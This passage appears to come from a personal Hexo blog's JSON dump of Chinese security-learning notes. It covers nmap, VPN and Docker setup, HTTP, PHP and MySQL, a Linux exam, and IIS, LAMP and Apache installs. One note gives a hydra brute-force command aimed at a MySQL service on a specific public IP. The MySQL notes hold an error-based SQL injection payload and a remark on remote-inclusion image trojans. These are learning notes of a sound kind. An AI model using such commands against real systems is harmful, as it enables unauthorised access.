Desktop/report.mxl报告输出到文件 nmap -sS 半开放扫描（默认方式） nmap -p 80 指定扫描端口 nmap -O ip 探测操作系统版本 nmap -A 详细信息 nmap -iL 目录 根据ip列表进行扫描 nmap -iL 目录 --webxml 文件名 把结果以xml形式&gt;输出 到文件 python环境安装 1.安装python2.7 2.在家目录下创建.pip文件夹，把源文件移动进去 3.执行pip install requests 字典生成工具 pentest.db工具 解压，在目录中用cmd执行pip install lxml 使用 python pen.py 帮助 python pen.py --help 爆破工具 *BurpSuite *hydra*** hydra -l用户名 -p密码字典 -s指定非默认端口 -e ns空密码试探 -f成功后立刻停止 例子：hydra -l root -P 目录 -s 3308 -e ns -t 5 114.115.175.102 mysql","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://pengpengp.github.io/tags/sql注入/"}]},{"title":"Create_VPN","slug":"Create-VPN","date":"2018-12-26T13:24:00.000Z","updated":"2018-12-26T13:47:10.265Z","comments":true,"path":"2018/12/26/Create-VPN/","link":"","permalink":"https://pengpengp.github.io/2018/12/26/Create-VPN/","excerpt":"","text":"创建VPN连接 一.安装浏览器插件 hackbar、Header Edit、wappalzer、 proxy、server ip 二.在windows 2008上搭建vpn 搭建PPTP连接 1.打开服务管理器—&gt;添加角色—-&gt;勾选“网络策略和访问服务 ”——&gt;下一步—–&gt;勾选”路由和远程访问服务”—&gt;开始安装 2.角色中出现了“路由和远程访问”，现在是红色的，右键选择配置它，打开向导—&gt;选择自定义配置–&gt;服务里全选–&gt;完成–&gt;变成绿色 3.新增一个接口：ipv4–&gt;NAT—&gt;新建一个接口–&gt;选择要使用的网卡—&gt;接口类型选择“公用接口连接到Internet”,勾选“在此接口上启用NAT” 4.开始菜单–&gt;管理工具–&gt;网络策略服务器–&gt;策略–&gt;网络策略–&gt;把里面的两项被组织的属性改成“授予访问权限” 5.服务器管理器–&gt;配置–&gt;本地用户和组–&gt;添加一个用户–&gt;填写用户名、密码、勾选“用户不能更改密码”和“密码永不过期”，去掉“下次登陆须更改密码”的勾，点创建。 6.开始菜单–&gt;管理工具–&gt;本地安全策略–&gt;本地策略–&gt;用户权限分配–&gt;拒绝本地登陆，添加vpn用户—&gt;拒绝通过远程桌面登陆,添加vpn用户。 7.连接VPN：在客户机创建一个新连接–&gt;选择连接到工作区—&gt;使用我的internet连接–&gt;填写ip地址–&gt;填写之前创建的VPN用户名和密码–&gt;连接即可 三.docker： 安装docker：sudo apt-get install docker.io 安装加速器（可选）https://yeasy.gitbooks.io/docker_practice/install/mirror.html 或者在 /etc/docker/daemon.json 中写入 { “registry-mirrors”: [“https://registry.docker-cn.com&quot;] } 启动docker：sudo docker run –rm -it alpine /bin/sh 在docker中启动ubuntu：sudo docker run –rm -it ubuntu /bin/sh 在docker中启动centOS：sudo docker run –rm -it centos /bin/sh 四.VPN :PPTP L2TP 第一种连接方法： 1.把镜像拉入虚拟机： 2.docker pull mobtitude/vpn-pptp然后创建一个文件chap-secrets，打开写入 name password 并记住路径/vpn-k 3.docker run -d –privileged –net host -v /root/chap-secrets:/ppp/chap-secrets mobtitude/vpn-pptp 第二种连接方法： 1.docker pull hwdsl2/ipsec-vpn-server 2.modprobe af_key 3.VPN_IPSEC_PSK=ipsec-keydocVPN_USER=unameVPN_PASSWORD=upass 4.docker run –name vpn-docker –privileged –env-file /root/vpn.env -p 500:500/udp -p 4500:4500/udp -v /lib/modules:/lib/modules:ro -d –privileged hwdsl2/ipsec-vpn-server 第三种方法：使用shadowsocks工具代理连接VPN 1.apt install shadowsocks先安装 2.修改配置文件 vi /etc/shadowsocks/config.json &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;server_port&quot;:8888, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;123456&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false, &quot;workers&quot;: 1, &quot;prefer_ipv6&quot;: false 3.（可选）开启BBR加速支持echo “net.core.default_qdisc=fq” &gt;&gt; /etc/sysctl.confecho “net.ipv4.tcp_congestion_control=bbr” &gt;&gt; /etc/sysctl.confsysctl -plsmod | grep bbr","categories":[],"tags":[]},{"title":"http_request ","slug":"http-request","date":"2018-12-24T13:44:39.000Z","updated":"2018-12-24T13:58:58.330Z","comments":true,"path":"2018/12/24/http-request/","link":"","permalink":"https://pengpengp.github.io/2018/12/24/http-request/","excerpt":"","text":"*** 一.http基础： URL：http://admin:123@www.baidu.com：80/new/index.php？id=1# *协议 + http基础认证 +域名 +端口 +路径 +文件名 +参数 +锚部分 URL编码** ‘’ --%27 “” --%22 # --%23 空格 --%20 % --%25 GET\\POST请求结构 GET请求 GET /HTTP基础/123.txt /HTTP/1.1 hOST:192.168.11.111:8000 Accept：*/* 换行 POST请求 POST /HTTP基础/123.txt /HTTP/1.1 hOST:192.168.11.111:8000 Accept：*/* 换行 id=123&amp;password=123 请求方法： GET HEAD 用于捕获报头 PUT iis put方法漏洞（自己研究） DELETE 请求删除 CONNECT OPTIONS 允许客户端查看服务器支持的方法 *状态码 302临时重定向（location） 301永久跳转 百度看一下区别 400 403 禁止访问 404 Not Found 405 不允许 5xx 服务器问题（代码） 练习：用wireshark抓http数据包 ** 二.总结请求头： Host：表示服务器监听的端口号； User-Agent：请求所使用的浏览器 Accept：可接受的响应类型 例子：Accept: text/plain（当作文本不处理） text/html （调用HTML解析器进行解析） Accept-language：可接受的相应语言清单 例子：zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding： 可接受的响应的编码方式 例子：gzip, deflate Cache-Control：指定当前的请求/回复中，是否使用缓存 Pragma：只用于客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。如果所有的中间服务器都以实现http/1.1为标准，那么直接使用Cache-Control:no-cache即可，如果不是的话，就要包含两个字段 Connection：处理完这次请求后是否断开连接还是继续保持连接 例子：close Referer：客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的（防盗链） Cookie：客户机通过这个头可以向服务器带数据 *三.重点： 五层模型、tcp三次握手 、 四次挥手 、wireshark、http请求\\响应的行、头、空行、内容 、burpSuite代理，看数据包","categories":[],"tags":[]},{"title":"PHP_useage","slug":"PHP-useage","date":"2018-12-23T09:36:45.000Z","updated":"2018-12-23T09:55:59.146Z","comments":true,"path":"2018/12/23/PHP-useage/","link":"","permalink":"https://pengpengp.github.io/2018/12/23/PHP-useage/","excerpt":"","text":"*** php用法 *** 文件包含 include(‘文件名’) require(‘文件名’) 用法1.包含头信息—每个页面头部都是一样的 用法2.包含账号密码的配置文件 用法3.包含远程文件 include “http://www.baidu.com&quot;; 注意：远程文件任何后缀都可以打开（图片木马的制作执行） 区别:include出错会继续执行，程序开始时候包含；require出错终止，在执行到require代码时才包含进来 //伪协议常用 https://www.leavesongs.com/PENETRATION/php-filter-magic.html cookie setcookie(‘user’,’admin’，time()+3600)设置一个cookie $_COOKIE[‘user’]获取一个cookie 如何放置cookie伪造？ setcookie(‘id’,’’,time()-1)清空COOKIE session—-全局变量 session_start()启动session功能 例子PHP用session做验证： session_start(); $_SESSION[&apos;name&apos;]=&quot;za&quot;; 验证 if(isset($_SESSION[&apos;name&apos;])){ echo &quot;欢迎&quot;; } session_destory（） 删除session创建的文件 //header(&quot;location:a.php&quot;);跳转 ** PHP中的文件上传： 接收：$_FILES; mysql 往表中插入数据： insert into 表名称(字段1，字段2…) value(字段1的值，字段2的值…) 例子：insert into news(title,content) value(‘标题’,’内容‘)； 查询数据： select 字段名1,字段名2,…,字段名n from 表名称 select username,password from user where id =1;单条件 select * from stu where number=31100 and name=hu;多条件用and连接 select 字段1，字段2，字段n from 表名 limit 0,1；用limit加限制条件 从0开始读1条 limit a,b limit—限制读取记录 a—索引 b—-记录数 更新： update 表名 set 字段1=新值1，字段2=新值2 条件； 删除表： delete from 表名 条件；一定要加好条件，否则都删了 delete from 表名；清空一个表 like子句： 通配符： *表示任意的字符 %表示任意的字符 ？表示任意一个字符 select * from 表名 where name like &apos;%sd&apos;; union*** 联合查询 select * from 表1 union select * from 表2；把表1和表2内容放在一起展示 注意：表1和表2中字段个数要保持一致，否则会报错 order by 条件*** 根据条件排序 select * from user where city =&apos;beijng&apos; order by name; ASC（升序） 或DESC（降序）默认升序 order by 1\\2\\3.。。 根据第几列来排序，如果超过列数就会报错***** group by 根据一个或多个列对结果进行分组，常和count sum、AVG组合使用 select name，count（*）from emply by name；根据名字来给表分组； 删除字段： alter table 表名 drop 字段名；在表中将某个字段删除 增加字段： alter table 字段名 add 字段名 字段类型 改字段： alter table to modify 字段名 字段类型; 改表名： alter table 原表名 rename to 新表名; 导入数据： 方法1.mysql -uroot -p 密码 &lt; 要导入的数据（注意：.sql中要自动创建数据库，如果runoob.sql中不会自动创建数据库，需要用第二种方法） 方法2.登录mysql，use数据库，source 路径文件 方法3.mysqlimport -uroot -p --local database_name dump.txt dump.txt（注意：dump.txt不会创建数据库时，需要database_name） 导出数据： 方法1.select * from 表名 into outfile 文件路径； 注释**注入 #（%23） -- 注释当前行 /* */ 中间注释 查询用户连接数 select connection_id(); 替换字符 例子 select insert(&apos;ichunqiu&apos;,1,1,&apos;kk&apos;);结果是kkchunqiu 截取字符串 例子 select LEFT(&quot;helloworld&quot;,5);结果是hello select LEFT（被截取的字符串，左截取长度）; select RIGHT 同理 截取 select substring()/mid()/substr()都是三个参数，第一个：被截取的字符串，第二个：开始的位置，第三个：截取的长度 2个报错函数*** 一般情况下要放在条件后面 1.extractvalue(XML_document，XPath_string)； 例子： select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e)); 两个参数（1，拼接的第二个报错参数） 2.UPDATEXML (XML_document, XPath_string, new_value); updatexml（1，拼接参数，1）； 去重函数 select distinct title from news;不显示重复函数 把查询结果连接在一起 group_concat(DISTINCT field) from table_name where conditions; PHP连接mysql数据库 方法1：使用mysqli扩展连接(面向对象) 方法2：使用mysql扩展（php低于5.5） 方法3：使用PDO技术（面向对象的，防止sql注入）","categories":[],"tags":[]},{"title":"php_shuzu","slug":"php-shuzu","date":"2018-12-16T14:07:40.000Z","updated":"2018-12-16T14:14:13.484Z","comments":true,"path":"2018/12/16/php-shuzu/","link":"","permalink":"https://pengpengp.github.io/2018/12/16/php-shuzu/","excerpt":"","text":"数组函数 对象数组：定义一个数组：第一种$arr=array();或者第二种$arr =[]; 创建数组时添加元素：$arr=array(&apos;wang&apos;,&apos;133&apos;); 数组分类：关联数组和索引数组： 关联数组： $arr1=[‘name’=&gt;’wang’,‘pass’=&gt;’111’]; 索引数组：$arr=array(‘wang’,’133’); 索引数组添加元素：$arr51[2] = ‘144’; 关联数组添加内容：$arr[“fun”]=’钓鱼’; 混合关联数组和混合数组：$arr =array(‘name’=&gt;’wang’,18,5 =&gt;’hello’); 数组可以放任何类型的数据$arr6 =[fopen(),true,3.14,[123,455]]; 数组长度计算：echo count（$arr）; echo sizeof($arr6); 数组中元素的排序：sort($arr)升序$arr7 =[12,5,6,’12a’];sort($arr7) ; 数组的输出：索引数组：echo $arr7[0];关联数组：echo $arr[“name”]; 用foreach($arr as $key=&gt;$value){ echo $key,$value; 用for ($i=0;$i&lt;count（$arr）;$i++){echo $arr[$i];} 统计数组键个数array_count_value()创建包含数组所有键名的新数组：array_keys() 数组指针：current()销毁变量：unset（）判断变量是否定义isset()合并两个数组，一个组是键名，另一个为值array_combine() 函数函数名不区分大小写function name(){echo “yi”;}echo “wang”;name(); //wangyi 函数中传入参数：function b($a,$b){ echo $a+$b;}b(123,456); //579 函数返回值：function b($a,$b){$count=$a+$b;return $count;}b(123,456);$data=b(123,456);echo $data; 随机数 rand（）练习： //参数1舒勇ARGV[1]获取，参数2使用ARGV[2] 参数传入后是string格式,获取随机从命令行输入的随机参数function suiji($a,$b){ $a= (int)$a;$b=(int)$b; if ($a==”” || $b==””){ print “请输入两个正整数”;return;}else if ($a&gt;$b){ $rr=rand($a,$b);}else { $tmp=$b; $b=$a; $a=$tmp; $rr=rand($a,$b);}echo $rr;}suiji($argv[1],$argv[2]); 面向对象：class person{public $name =’duan’;public $age=21; function go(){ echo $this-&gt;name .’is running’;}} $p1=new person();$p1-&gt;name =’xu’;echo $p1-&gt;name; $p2=new person();$p2-&gt;name=’cai’; 构造函数：destruct继承 class newperson extends person{} 方法覆盖: 全局变量：$_GET; $_POST;","categories":[],"tags":[]},{"title":"linux exam","slug":"linux-exam","date":"2018-12-08T05:40:43.000Z","updated":"2018-12-08T05:44:02.724Z","comments":true,"path":"2018/12/08/linux-exam/","link":"","permalink":"https://pengpengp.github.io/2018/12/08/linux-exam/","excerpt":"","text":"Linux基础知识试卷 一、选择题 下面哪个Linux命令可以一次显示一页内容？(C)A. pause暂停B. cat 读取文件内容C. more 分页显示D. grep 查找字符 统计当前目录(或文件)所占磁盘空间的大小命令是：(B)A. df / 查看指定分区大小B. du / 查看根目录文件大小C. du 查看当前目录大小D. df 查看所有分区大小 怎样更改一个文件的权限设置？(B)A. attribB. chmod 改权限C. changeD. file 假如您需要找出 /etc/my.conf 文件属于哪个包 (package) ，您可以执行：A. rpm -q /etc/my.conf 查询软件包 +软件包名称B. rpm -requires /etc/my.confC. rpm -qf /etc/my.conf查看某个文件属于哪个软件包，可以是普通文件或可执行文件，跟文件的绝对路径D. rpm -q | grep /etc/my.conf 查询是否安装了某个软件13.在使用了shadow口令的系统中，/etc/passwd和/etc/shadow两个文件的权限正确的是：（C）A. -rw-r—– , -r——–B. -rw-r–r– , -r–r–r–C. -rw-r–r– , -r——–D. -rw-r–rw- , -r—–r–14．下面哪个参数可以删除一个用户并同时删除用户的主目录？(C)A. rmuser -rB. deluser –r deluser –remove-homeC. userdel -rD. usermgr -r17．如果你的umask设置为022，缺省的你创建的文件的权限为：(D)A. —-w–w-B. -w–w—-C. r-xr-x—D. rw-r–r—root的缺省unmask是022，一般用户是002。例如：unmask为022的用户创建了一个新文件，那么新文件的权限644，而目录则为755。如果用户的umask为000，则创建的文件权限为666，目录权限为777，运行umask命令可以查看用户自己的umask值。18．在一条命令中如何查找一个二进制命令 Xconfigurator 的路径？(D)A. apropos Xconfigurator 用来通过关键字查找定位手册页的名字和描述。B. find Xconfigurator 查文件C. where Xconfigurator whereisD. which Xconfigurator20．运行一个脚本，用户不需要什么样的权限？（B）A. readB. writeC. executeD. browse on the directory23．在 bash 中, 在一条命令后加入”1&gt;&amp;2” 意味着：（B）0—标准输入、1—标准输出、2—标准错误输出A. 标准错误输出重定向到标准输入B. 标准输入重定向到标准错误输出C. 标准输出重定向到标准错误输出D. 标准输出重定向到标准输入24．下面哪条命令可以把f1.txt复制为f2.txt?（C）A. cp f1.txt | f2.txtB. cat f1.txt | f2.txtC. cat f1.txt &gt; f2.txtD. copy f1.txt | f2.txt25．显示一个文件最后几行的命令是： （B）A. tacB. tailC. rearD. last31.使用ln命令将生成了一个指向文件old的符号链接new，如果你将文件old删除，是否还能够访问文件中的数据？ （A）A. 不可能再访问B. 仍然可以访问C. 能否访问取决于文件的所有者D. 能否访问取决于文件的权限37.如何在文件中查找显示所有以”“打头的行？A. find \\ file 没有效果B. wc -l &lt; file wc –l数一下文件内容行数C. grep -n fileD. grep ‘^\\’ file grep -n ‘^[a-z]’以a-z开头 grep ‘\\a$’以a结尾. (小数点)：代表『一定有一个任意字节』的意思；grep -n ‘g..d’ (星号)：代表『重复前一个字符， 0 到无穷多次』的意思，为组合形态grep -n ‘g.g’搜索g开头g结尾的行\\表示匹配字符38.在ps命令中什么参数是用来显示所有用户的进程的？（A）A. a 所有用户B. bC. u 某个用户 –u rootD. x 与a搭配，显示完整进程40.如何显示Linux系统中注册的用户数（包含系统用户）？（D）A. account -lB. nl /etc/passwd |head 显示头十行C. wc –users /etc/passwdD. wc –lines /etc/passwd 显示用户数42.命令 kill 9 的含义是： (A)A. kills the process whose PID is 9.B. kills all processes belonging to UID 9.C. sends SIGKILL to the process whose PID is 9.D. sends SIGTERM to the process whose PID IS 9.43.如何删除一个非空子目录/tmp？（D）A. del /tmp/B. rm -rf /tmp 删除tmp目录C. rm -Ra /tmp/ R与r相同 a未知D. rm -rf /tmp/ 删除tmp目录内容48.在Linux系统中的脚本文件一般以什么开头？（B）A. $/bin/shB. #!/bin/shC. use /bin/shD. set shell=/bin/sh49.下面哪种写法表示如果cmd1成功执行，则执行cmd2命令？（A）A. cmd1&amp;&amp;cmd2B. cmd1|cmd2 把cmd1结果导入cmd2执行C. cmd1;cmd2D. cmd1||cmd251.Linux中，提供TCP/IP包过滤功能的软件叫什么？（C）A. rarpB. route 路由C. iptables 防火墙D. filter53.在vi中退出不保存的命令是？（A）A. :q 退出B. :w 保存C. :wq 保存退出D. :q! 强退55.使用什么命令检测基本网络连接？（A）A. pingB. routeC. netstat 连接状态D. ifconfig 网卡信息56.下面哪个协议使用了二个以上的端口？（B）A. telnet 23B. FTP 20、21C. ssh 22D. HTTP 8059.如何在Debian系统中安装rpm包？(D)alien是包转换工具A. alien pkgname.rpm alien –I .rpmB. dpkg –rpm pkgname.rpm dpkg –I .rpmC. dpkg –alien pkgname.rpmD. alien pkganme.rpm ; dpkg -i pkganme.deb 60.在安装软件时下面哪一步需要root权限？(D)A. makeB. make depsC. make configD. make install install需要61.什么命令用来只更新已经安装过的rpm软件包？（B）A. rpm -U .rpm 强行安装B. rpm -F .rpm 只更新C. rpm -e .rpm 卸载D. rpm -q .rpm 查询包64.下面哪个命令可以压缩部分文件：（C）A. tar -dzvf filename.tgz 特殊文件B. tar -tzvf filename.tgz 查询包内容C. tar -czvf filename.tgz 打包压缩D. tar -xzvf filename.tgz 解压缩67.对于Apache服务器，提供的子进程的缺省的用户是：（D）A. rootB. apachedC. httpdD. nobody69.apache的主配置文件是：（A）A. httpd.confB. httpd.cfgC. access.cfgD. apache.conf77.通过Makefile来安装已编译过的代码的命令是：（D）A. make 编译B. installC. make dependD. make install 安装Configure检测安装平台是否具备所需条件78.什么命令解压缩tar文件？（B）A. tar -czvf filename.tgzB. tar -xzvf filename.tgzC. tar -tzvf filename.tgzD. tar -dzvf filename.tgz84.命令 netstat -a 停了很长时间没有响应，这可能是哪里的问题？（B）A. NFS.B. DNS.C. NIS.D. routing.85.ping使用的协议是：（D）A. TCPB. UDPC. SMBD. ICMP86.下面哪个命令不是用来查看网络故障的？（B）A. pingB. initC. telnetD. netstat87.拨号上网使用的协议通常是：（A）A. PPP 网络安全系统认证（Authentication）、授权（Authorization）和计费（Accounting）B. UUCP 文件传输协议C. SLIP Serial Line Internet Protocol，串行线路网际协议 拨号D. Ethernet88.TCP/IP中，哪个协议是用来进行IP自动分配的？（C）A. ARP 局域网通信B. NFS Network File System）即网络文件系统—freeBSDC. DHCPD. DNS 域名解析90.下面哪个功能用来生成一个文件的校验码？(A)？DA. md5 密文B. tarC. crypt crypt 库D. md5sum md5sum aaa.txt &gt; checksum/aaa.md5 生成校验文件93.如何停止一台机器的telnet服务？（A）A. Put NONE in /etc/telnet.allow 白名单 sshd:192.168.220.1 in.telnetd:192.168.220.1B. Put a line ‘ALL:ALL’ in /etc/hosts.deny 黑名单C. Comment the telnet entry in /etc/inittab 配置启动模式D. Comment the telnet entry in /etc/xinetd.conf 用来管理多种轻量级Internet服务 xinetd.conf代替原来的inetd.conf 二、操作题：1.假设你是系统管理员，需要增加一个新的用户账号zheng，为新用户设置初始密码，锁定用户账号uly，并删除用户账号chang。答：Useradd zhengPassword zhengusermod -s /sbin/nologin wangshibo userdel chang 2.若给需要将/home/zheng目录下的所有文件打包压缩成/tmp/zheng.tar.gz，你准备怎么做？当需要从压缩包中恢复时，又该如何处理？答：Tar –zcvf /tmp/zheng.tar.gz /home/zheng/*Tar –zxvf zheng.tar.gz3.介绍什么是桥接，什么是nat？答：桥接是把虚拟机模拟成同网中的一台设备Nat 是路由模式，把虚拟机模拟成另一个网段的设备并路由到本网段完整试题及答案1 完整试题及答案2","categories":[],"tags":[]},{"title":"windows server 2008 iis服务器搭建","slug":"iis","date":"2018-12-06T14:07:28.000Z","updated":"2018-12-07T13:28:25.401Z","comments":true,"path":"2018/12/06/iis/","link":"","permalink":"https://pengpengp.github.io/2018/12/06/iis/","excerpt":"","text":"准备工作：首先在虚拟机中安装好windows server 2008 R2系统（64位），下载sql server 2008版本（64位）不用拉进虚拟机。 搭建网站：1.进入windows server 2008，打开服务管理器—–&gt;添加角色—-&gt;添加web服务器——-&gt;勾选常见HTTP功能（需要后台的话还要勾选应用程序开发）、iis可承载web核心 ——&gt;安装、完成即可；2.导入网站源码（以aspcms为实验对象）在C盘创建个文件夹叫www，把源码复制进去； 3.在iis服务器中点右键选择添加网站。 网站设置：1.在iis管理器中找到自己刚建的网站右键“编辑权限”，——&gt;安全——&gt;编辑———&gt;给user赋予完全控制的权限；2.iis管理器中找到“ASP”双击启动，更改“启用父路径”位“TRUE”；3.iis管理器中打开“默认文档”，把刚才导入的网站执行文件名字导入(如果里面有了就不用了)；4.iis管理器中的应用池—–&gt;基本设置改为自己想要的.net版本 —–&gt;高级设置中把“启用32位应用程序”支持改为“true” sql server安装：1.用虚拟机cd加载sql server的镜像，选择“全新安装” &gt;功能选择：数据库引擎服务、 2.全新安装，一路下一步——-&gt;功能选择：数据库引擎服务、客户端工具连接、管理工具、sql客户端连接sdk——–&gt;验证方式：混合模式，用户名sa—安装。 3.开始菜单——-&gt; sql server management studio——-&gt;服务器名127.0.0.1、验证方式选择windows验证—–&gt;完成。 把Access数据库文件导入sql server数据库：新建一个数据库—–&gt;右键点任务——-&gt;导入数据——–&gt;数据源选Access（导入文件在网站配置文件中能找到）———&gt;选择要导入的表和视图———&gt;修改配置文件。","categories":[],"tags":[]},{"title":"LAMP环境搭建","slug":"LAMP","date":"2018-12-05T13:30:09.000Z","updated":"2018-12-06T13:11:35.536Z","comments":true,"path":"2018/12/05/LAMP/","link":"","permalink":"https://pengpengp.github.io/2018/12/05/LAMP/","excerpt":"","text":"l—linux；A—Apache；M—mysql;P—PHP;Apache是一款web服务器，mysql是多线程、多用户管理系统，PHP可以用来编写网站源代码，作为Apache的扩展，今天的主题就是如何搭建一款LAMP环境。 Apache： 1.安装yum install httpd httpd-devel httpd-menaul mod_ssl mod_perl mod_auth_mysql -y 2.启动服务service httpd start 3.更改servername（vi /etc/httpd/conf/httpd.conf） 4.重启apache服务：service httpd restart 5.启动Apache服务service httpd start 6.设置开机自启动chkconfig httpd on mysql: 1.安装yum install mysql-server mysql -y 2.设置mysql开机启动chkconfig mysqld on 3.启动服务service mysqld start 4.mysql服务初始化 mysql_secure_installation（如果默认有密码，在/etc/my.cnf中加入参数skip-grant-tables然后在输入密码阶段，直接回车登陆） PHP： 1.安装yum install php php-mysql php-gd libjpeg* php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-bcmath php-mhash libmcrypt -y 2.修改PHP配置文件vi /etc/httpd/conf/httpd.conf 3.重启apache服务： service httpd restart 4.打开网页输入localhost即可看到效果 5.把自己做好的网页文件传入/var/www/html目录下，再打开网页 6.打开mysql，选择数据库use vauditdemo； 7.用source /var/www/html/install/install.sql命令导入数据库文件","categories":[],"tags":[]},{"title":"学习如何在linux环境安装Apache","slug":"APACHE-linux","date":"2018-12-04T12:27:34.000Z","updated":"2018-12-05T07:33:59.877Z","comments":true,"path":"2018/12/04/APACHE-linux/","link":"","permalink":"https://pengpengp.github.io/2018/12/04/APACHE-linux/","excerpt":"","text":"1.首先需要下载好安装套件（yum groupinstall “Development Tools”）然后在网上下载好apache的安装包,（这里使用下载的是源码压缩包，名字为httpd-2.4.37.tar.gz）2.把httpd-2.4.37.tar.gz传到虚拟机中，我用的是centOS7。 这里为了把文件传到linux，使用了openssh连接虚拟机 通过openssh把文件传到centOS桌面上 3.用源码方式安装httpd（apache）–step1：解压–&gt;step2：configure–&gt;解决依赖–&gt;step3：make–&gt;step4：make install，这里的详细操作步骤及我遇到的问题如下： 用tar -zxvf解压httpd-2.4.37.tar.gz，在桌面上生成了一个httpd-2.4.37 文件夹，cd进入文件夹 运行./configure –prefix=/usr/local/ 报错：依赖问题需要解决，提示的是缺少APR组件 秉承着有问题找百度的精神，我找了一篇帖子…地址 下载并解压apr-1.6.5.tar.gz apr-util-1.6.1.tar.gz 两个文件，开始安装 （这里再啰嗦一下源码文件通用的安装思路）解压文件–&gt;进入解压生成的文件夹–&gt;./configure –&gt;make&amp;&amp;make install 我在安装apr-util的时候文件损坏了，所以用yum安装了这个文件 依然要解决依赖，下载pcre-8.10.zip文件用openssh传到虚拟机（注意文件用unzip解压） 应该是缺少gcc组件yum install -y gcc gcc-c++ 问题解决 回到httpd-2.4.37文件夹，cd进入用./configure –/usr/local/命令继续安装step2的操作，再次报错./configure –prefix=/usr/local命令指定路径接下来还要重新安装apr-util-1.6.1，./configure继续报错error: APR could not be located. Please use the –with-apr option.里面说的意思应该是apr-util-1.6.1运行需要apr-1.4.5目录（也就是上一个软件安装目录）的支持所以我们执行命令[root@localhost apr-util-1.6.1]# ./configure –with-apr来执行，成功完成 回到httpd目录继续执行./configure –prefix=/usr/local/命令，继续报错。。。error1，不知道为什么，百度了半天没有头绪，我就猜是不是报错本身是错误的，所以继续输入make install，神奇的是竟然没有报错漫长的安装过程终于结束了4.关闭防火墙，启动Apache服务 centos 7关防火墙：systemctl stop firewalld; centos 6关防火墙：service iptables stop 启动Apache服务的方法：安装的根目录/usr/local/apache2/bin/apachectl start(可以再输入一次”路径 restart”) 启动Apache服务/usr/local/bin/apachectl start又报错了 这个好解决，cd进入apache目录下的htdocs目录，编辑httpd.conf文件vi conf/httpd.conf 在里面搜索#ServerName 把前面的注释符号#去掉保存 现在再次启动apache服务start``````/usr/local/bin/apachectl restart```123![apache start.jpg](APACHE-linux/apache start.jpg)### 5.输入虚拟机IP地址来试一下新建的网站吧（我在这就在虚拟机中测试一下）```[root@localhost Desktop]# curl 192.168.11.147 &lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 实际的图在这6.终于到了最后一步，是不是很好奇刚才打开的网页文件存放在哪儿呢？其实它就在刚才安装的根目录/usr/local/apache2/htdocs里面安静的呆着呢，试着用我们自己喜欢的网站成品文件替换index.heml，然后再次访问虚拟机的ip地址，是不是一个个人专属的Apache网站就搭建好了哈哈。日记到这里就结束了，明天继续更新","categories":[],"tags":[]},{"title":"在windows下如何开通自己的博客","slug":"first_blog","date":"2018-12-03T07:55:56.000Z","updated":"2018-12-04T10:26:31.161Z","comments":true,"path":"2018/12/03/first_blog/","link":"","permalink":"https://pengpengp.github.io/2018/12/03/first_blog/","excerpt":"","text":"先期准备工作：配置.net 安装shadowsocks（代理服务器） 1.github安装注册，下载githubDesktop（同步工具）2.下载node.js安装包node.js官网* 安装好node.js后可以cmd中运行npm试试安装成功了没 （node.js安装软件用的命令） 3.下载git（百度搜git官网）或点击git官网并在硬盘中创建一个自己博客的目录（例：c：\\blog），然后在目录中用cmd命令行安装hexo并初始化文件夹，hexo安装和文件夹初始化方法如下：* 安装hexo的方法：在文件夹地址栏中把地址改为cmd然后回车打开cmd窗口， 运行 npm install -g hexo-cli命令 安装hexo（hexo.io）（hexo是自动生成网页的工具） * 还是在d:\\blog目录打开cmd命令行输入hexo init.回车， 来初始化你博客目录 4.用VS编辑软件打开d：\\blog ,选择_config.yml，把url改成自己的博客地址 5.申请自己的博客仓库（域名）注意：必须是注册名.github.io的格式否则无法访问（www.github.com），仓库创建也可以在注册github时操作。6.利用素材生成网页文件包（即生成/public目录）；hexo目录包含三个重点文件夹：theme主题、source内容、public网站成品* cmd窗口中 执行hexo generate来生成/public文件夹（做好的网页文件夹） 然后执行hexo server 来启动你的服务器,提示hexo运行的地址localhost：4000，在浏览器中输入localhost：4000即可看到你创建的页面 7.登录gitHub desktop 客户端 克隆刚才的路径（界面最右侧有个“clone”按钮，打开选择你之前创建的域名）来下载你网页文件到本地硬盘（这里要记住保存的路径，方便之后替换）* 先用克隆的方法下载网页文件到本地路径（默认下载到我的文档中的GitHub文件夹中，有个文件夹名字是你的域名） * 打开名字是域名的文件夹，删除里面的内容（隐藏文件不要删） * 最后把之前博客目录里面的public目录文件拷贝到域名文件夹中 8.上传：这时打开hexo Desktop软件，就会提示你有变动，先保存变动（commit to master）然后上传（Fetch orgin）大家就可以通过你的域名来看你的博客了！ 附：换主题 先找一个别人做好的主题文件， 在cmd 输入 git clone“url” 下载到跟目标，把它解压到/theme文件夹中， 修改config文件theme为主题文件夹的名字，然后删除public文件夹重新生成网页文件* 删除public目录---git clear 重新生成网页文件（即public目录）---执行hexo generate 重新开启服务器 ---hexo server 9.发微博：hexo new “my new post”在/source/_post/文件夹中新建一个.md文件，用编辑软件打开这个文件就可以修改内容发表了。（发表方法见第8条的上传） 学习使用markdown语法 markdown中文文档样子","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2018-12-03T04:09:11.480Z","updated":"2018-12-03T04:09:11.480Z","comments":true,"path":"2018/12/03/hello-world/","link":"","permalink":"https://pengpengp.github.io/2018/12/03/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}